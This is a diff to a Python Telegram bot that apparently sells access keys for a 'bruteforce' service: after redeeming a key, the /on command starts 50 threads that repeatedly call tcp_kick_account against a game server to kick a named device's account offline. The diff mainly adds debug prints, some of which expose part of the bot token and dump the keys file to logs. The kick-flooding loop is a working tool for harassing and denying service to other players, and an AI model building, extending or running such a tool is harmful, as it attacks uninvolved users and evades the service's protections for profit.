@@ -18,6 +18,7 @@ _KEYS_PATH = os.path.join(_BASEDIR, KEYS_FILE)
 _USERS_PATH = os.path.join(_BASEDIR, USERS_FILE)
 
 bot = telebot.TeleBot(BOT_TOKEN)
+print("[DEBUG] Bot initialized with token:", BOT_TOKEN[:20] + "...")
 
 data_lock = threading.Lock()
 cancel_events = {}
@@ -28,7 +29,10 @@ device_sessions = {}  # device_id -> {'uid': int, 'cancel': Event, 'threads': li
 
 def load_keys():
     keys = {}
-    if not os.path.exists(_KEYS_PATH): return keys
+    if not os.path.exists(_KEYS_PATH):
+        print(f"[DEBUG] load_keys: keys file not found at {_KEYS_PATH}")
+        return keys
+    print(f"[DEBUG] load_keys: loading keys from {_KEYS_PATH}")
     with open(_KEYS_PATH) as f:
         for line in f:
             line = line.strip()
@@ -73,16 +77,27 @@ def is_admin(user_id):
     return user_id in ADMIN_IDS
 
 def is_authorized(user_id):
-    if is_admin(user_id): return True
+    if is_admin(user_id):
+        print(f"[DEBUG] is_authorized({user_id}): admin, authorized")
+        return True
     users = load_users()
-    if user_id not in users: return False
+    if user_id not in users:
+        print(f"[DEBUG] is_authorized({user_id}): not in users file, DENIED")
+        return False
     key = users[user_id].get('key', '')
-    if not key: return False
+    if not key:
+        print(f"[DEBUG] is_authorized({user_id}): no key on record, DENIED")
+        return False
     keys = load_keys()
     info = keys.get(key, {})
-    if info.get('status') == 'revoked': return False
+    if info.get('status') == 'revoked':
+        print(f"[DEBUG] is_authorized({user_id}): key {key[:12]}... REVOKED, DENIED")
+        return False
     expiry = info.get('expiry_ts', 0)
-    if expiry > 0 and time.time() > expiry: return False
+    if expiry > 0 and time.time() > expiry:
+        print(f"[DEBUG] is_authorized({user_id}): key {key[:12]}... EXPIRED, DENIED")
+        return False
+    print(f"[DEBUG] is_authorized({user_id}): authorized (key {key[:12]}...)")
     return True
 
 # --- Bot commands ---
@@ -90,6 +105,7 @@ def is_authorized(user_id):
 @bot.message_handler(commands=['start'])
 def cmd_start(message):
     uid = message.from_user.id
+    print(f"[DEBUG] /start from user {uid} ({message.from_user.first_name})")
     if is_authorized(uid):
         bot.reply_to(message,
             "Welcome back!\n\n"
@@ -104,6 +120,7 @@ def cmd_start(message):
 @bot.message_handler(commands=['redeem'])
 def cmd_redeem(message):
     uid = message.from_user.id
+    print(f"[DEBUG] /redeem from user {uid}")
     if is_authorized(uid):
         bot.reply_to(message, "You already have access.")
         return
@@ -112,12 +129,15 @@ def cmd_redeem(message):
         bot.reply_to(message, "Usage: /redeem <KEY>")
         return
     key = args[1].strip().upper()
+    print(f"[DEBUG] /redeem: attempting key {key[:12]}...")
     with data_lock:
         keys = load_keys()
         if key not in keys:
+            print(f"[DEBUG] /redeem: key {key[:12]}... NOT FOUND in keys file")
             bot.reply_to(message, "Invalid key. Contact: @Shennxs")
             return
         if keys[key]['status'] != 'active':
+            print(f"[DEBUG] /redeem: key {key[:12]}... status is '{keys[key]['status']}' (not 'active')")
             bot.reply_to(message, "This key has already been used or revoked. Contact: @Shennxs")
             return
         keys[key]['status'] = 'used'
@@ -125,6 +145,7 @@ def cmd_redeem(message):
         users = load_users()
         users[uid] = {'name': message.from_user.first_name or str(uid), 'key': key}
         save_users(users)
+    print(f"[DEBUG] /redeem: key {key[:12]}... activated for user {uid} successfully")
     expiry = keys[key].get('expiry_ts', 0)
     exp_msg = ''
     if expiry > 0:
@@ -140,6 +161,7 @@ def cmd_redeem(message):
 @bot.message_handler(commands=['status'])
 def cmd_status(message):
     uid = message.from_user.id
+    print(f"[DEBUG] /status from user {uid}")
     if not is_authorized(uid):
         bot.reply_to(message, "No access. Contact: @Shennxs")
         return
@@ -175,22 +197,32 @@ def cmd_on(message):
         bot.reply_to(message, "Usage: /on <device_id>")
         return
     device_id = args[1].strip()
+    print(f"[DEBUG] /on: user {uid} requesting bruteforce on device '{device_id[:30]}...'")
     if device_id in device_sessions:
+        print(f"[DEBUG] /on: session already exists for '{device_id[:30]}...'")
         bot.reply_to(message, "Already running for this device. Use /off first.")
         return
     cancel = threading.Event()
     threads = []
+    attempt_count = 0
     def worker(did, c):
+        nonlocal attempt_count
         while not c.is_set():
             st, r = tcp_kick_account(did, GLOBAL_SERVERS[0][0], GLOBAL_SERVERS[0][1])
             with data_lock:
-                if st is True: stats['total_kicks'] += 1
-                else: stats['failed'] += 1
+                if st is True:
+                    stats['total_kicks'] += 1
+                    attempt_count += 1
+                    if attempt_count % 10 == 0:
+                        print(f"[DEBUG] worker for '{did[:30]}...': {attempt_count} successful kicks")
+                else:
+                    stats['failed'] += 1
             c.wait(1)
-    for _ in range(50):
+    for i in range(50):
         t = threading.Thread(target=worker, args=(device_id, cancel), daemon=True)
         t.start()
         threads.append(t)
+    print(f"[DEBUG] /on: launched 50 threads for '{device_id[:30]}...' by user {uid}")
     device_sessions[device_id] = {'uid': uid, 'cancel': cancel, 'threads': threads}
     bot.reply_to(message, f"Bruteforce ON for `{device_id[:30]}...`")
 
@@ -205,14 +237,18 @@ def cmd_off(message):
         bot.reply_to(message, "Usage: /off <device_id>")
         return
     device_id = args[1].strip()
+    print(f"[DEBUG] /off: user {uid} requesting stop for '{device_id[:30]}...'")
     if device_id not in device_sessions:
+        print(f"[DEBUG] /off: no session found for '{device_id[:30]}...'")
         bot.reply_to(message, "No active session for this device.")
         return
     if device_sessions[device_id]['uid'] != uid and not is_admin(uid):
+        print(f"[DEBUG] /off: user {uid} does NOT own session for '{device_id[:30]}...'")
         bot.reply_to(message, "This device belongs to another user.")
         return
     device_sessions[device_id]['cancel'].set()
     del device_sessions[device_id]
+    print(f"[DEBUG] /off: session stopped for '{device_id[:30]}...'")
     bot.reply_to(message, f"Bruteforce OFF for `{device_id[:30]}...`")
 
 # --- Admin commands ---
@@ -220,6 +256,7 @@ def cmd_off(message):
 @bot.message_handler(commands=['genkey'])
 def cmd_genkey(message):
     uid = message.from_user.id
+    print(f"[DEBUG] /genkey by admin {uid}")
     if not is_admin(uid):
         bot.reply_to(message, "Admin only.")
         return
@@ -242,6 +279,7 @@ def cmd_genkey(message):
         keys = load_keys()
         keys[key] = {'status': 'active', 'created_by': uid, 'expiry_ts': expiry_ts}
         save_keys(keys)
+    print(f"[DEBUG] /genkey: key {key[:12]}... generated with duration '{duration_label}' (expiry_ts={expiry_ts})")
     bot.reply_to(message, f"Key generated.\nDuration: {duration_label}\n\nUser redeems with:\n/redeem {key}")
     bot.send_message(message.chat.id, f"`{key}`", parse_mode="Markdown")
 
@@ -253,6 +291,7 @@ def cmd_keys(message):
         return
     with data_lock:
         keys = load_keys()
+    print(f"[DEBUG] cmd_keys: {len(keys)} keys loaded by admin {uid}")
     if not keys:
         bot.reply_to(message, "No keys.")
         return
@@ -345,6 +384,7 @@ def cmd_ban(message):
             save_users(users)
     if target in cancel_events:
         cancel_events[target].set()
+    print(f"[DEBUG] /ban: admin {uid} banned user {target}")
     bot.reply_to(message, f"User {target} banned.")
 
 @bot.message_handler(commands=['revoke'])
@@ -373,6 +413,7 @@ def cmd_revoke(message):
                     cancel_events[uid2].set()
                 del users[uid2]
         save_users(users)
+    print(f"[DEBUG] /revoke: admin {uid} revoked key {key[:12]}...")
     bot.reply_to(message, f"Key `{key[:12]}...` revoked. User removed and kicked if active.")
 
 @bot.message_handler(commands=['announcement'])
@@ -396,6 +437,7 @@ def cmd_announcement(message):
             sent += 1
         except:
             pass
+    print(f"[DEBUG] /announcement by admin {uid}: sent to {sent}/{len(targets)} users")
     bot.reply_to(message, f"Announcement sent to {sent}/{len(targets)} users.")
 
 if __name__ == '__main__':
@@ -426,7 +468,21 @@ if __name__ == '__main__':
     except Exception as e:
         print(f"[!] Failed to set commands: {e}")
 
-    print("Bot running...")
+    print("[DEBUG] Bot running... polling started")
+    print(f"[DEBUG] ADMIN_IDS: {ADMIN_IDS}")
+    print(f"[DEBUG] Keys file: {_KEYS_PATH}, Users file: {_USERS_PATH}")
+    if os.path.exists(_KEYS_PATH):
+        print(f"[DEBUG] Keys file exists. Content preview:")
+        with open(_KEYS_PATH) as _f:
+            for _i, _l in enumerate(_f):
+                if _i < 10:
+                    print(f"  [DEBUG] keys line: {_l.strip()}")
+    else:
+        print(f"[DEBUG] Keys file DOES NOT EXIST")
+    if os.path.exists(_USERS_PATH):
+        print(f"[DEBUG] Users file exists.")
+    else:
+        print(f"[DEBUG] Users file DOES NOT EXIST")
     while True:
         try:
             bot.infinity_polling(none_stop=True, skip_pending=True, timeout=30, long_polling_timeout=30)
